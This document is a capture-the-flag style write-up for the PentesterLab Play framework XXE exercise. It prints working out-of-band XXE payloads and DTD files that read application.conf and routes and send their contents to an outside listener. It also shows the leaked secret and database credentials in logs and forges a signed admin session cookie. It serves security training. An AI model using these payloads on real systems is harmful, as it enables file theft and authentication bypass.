#### 2.1. About exercise

URL: `https://pentesterlab.com/exercises/play_xxe`

The goal of the lab exercise is to retrieve the cookie signature key from the app's config, and then generate a valid cookie to authenticate as `admin`.

Also, the challenge requires disclosure of all routes to reach the (secret) URL, which may be a protected/internal resources.

Download the ISO for VMWare:
```
$ wget https://pentesterlab.com/exercises/play_xxe/iso
```

#### 2.2. App routes in Play framework

Documentation:
- `https://www.playframework.com/documentation/1.2/routes`
- Files: 
  - `conf/routes`
  - `conf/application.conf`


#### 2.3. Basic detection

```xml
<!DOCTYPE lol [<!ENTITY e "test2"> ]>
<root>
	<a>test1</a>
	<b>&e;</b>
</root>
```

Will most likely timeout:
```xml
<!DOCTYPE data SYSTEM "http://localhost/lol.dtd">
<root>
	<a>test1</a>
	<b>&e;</b>
</root>
```

Pointing the DTD to our server:
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://192.168.209.146:88/">
<data>&send;</data>
```
Logs:
```
Serving HTTP on 0.0.0.0 port 88 ...
192.168.209.136 - - [05/Mar/2020 07:13:20] "GET / HTTP/1.1" 200 -
```

#### 2.3. Reading the sensitive data

HTTP request:
```
POST http://172.16.201.246/login HTTP/1.1
Host: 172.16.201.246
Upgrade-Insecure-Requests: 1
Content-Type: text/xml

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://172.16.201.160:8888/dtd">
<x>&trigger;</x>
```

a) DTD file for reading the `application.conf` file:
```
<!ENTITY % f SYSTEM "file:///opt/play-2.1.3/xxe/conf/application.conf">
<!ENTITY % all "<!ENTITY trigger SYSTEM 'http://172.16.201.160:8888/?%f;'>">
%all;
```

b) DTD file for reading the `routes` file:
```
<!ENTITY % f SYSTEM "file:///opt/play-2.1.3/xxe/conf/routes">
<!ENTITY % all "<!ENTITY trigger SYSTEM 'http://172.16.201.160:8888/?%f;'>">
%all;
```


#### 2.4 HTTP logs

a) Contents of `/opt/play-2.1.3/xxe/conf/application.conf` (URL decoded and formatted):
```
172.16.201.246 - - [05/Dec/2018 06:20:15] "GET /dtd HTTP/1.1" 200 -
172.16.201.246 - - [05/Dec/2018 06:20:15] "GET /?
application.secret="X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG"
application.langs="en"
db.default.driver=com.mysql.jdbc.Driver
db.default.url="mysql://pentesterlab:pentesterlab@localhost/xxe"
ebean.default="models.*"
logger.root=ERROR
logger.play=INFO
logger.application=DEBUG
HTTP/1.1" 200 -
```

b) Contents of `/opt/play-2.1.3/xxe/conf/routes` (URL decoded and formatted):
```
172.16.201.246 - - [05/Dec/2018 06:24:33] "GET /dtd HTTP/1.1" 200 -
172.16.201.246 - - [05/Dec/2018 06:24:33] "GET /?
GET     /                           controllers.Application.index()
GET     /0ecf87346b9c0b370f8d63e6e7fed4f0             controllers.Application.secret_url()
GET       /login                   controllers.Application.login
POST      /login                   controllers.Application.login
GET       /logout                  controllers.Application.logout
GET     /assets/*file               controllers.Assets.at(path="/public", file) 
HTTP/1.1" 200 -
```

To reach the secret page:
```
# http http://172.16.201.246/0ecf87346b9c0b370f8d63e6e7fed4f0 -b
```


#### 2.5. Authentication bypass

Generic cookie format:
```
Cookie: PLAY_SESSION="[signature_goes_here]-user=admin"
```

To sign a valid cookie using `application.secret`:
```
# echo -n 'user=admin' | openssl dgst -sha1 -hmac 'X7G@Abg53=2p=][5F;uMNDm/QrDtVG0^iYHC3]Ov0t0E6b_amL16UynUbqS_?_eG'
(stdin)= a5b8363ce748cfbb5d654edc3676d440173b33de
```

Final cookie:
```
Cookie: PLAY_SESSION="a5b8363ce748cfbb5d654edc3676d440173b33de-user=admin"
```

Gaining access as `admin` user:
```
# http http://172.16.201.246/ Cookie:PLAY_SESSION="a5b8363ce748cfbb5d654edc3676d440173b33de-user=admin" -v
```
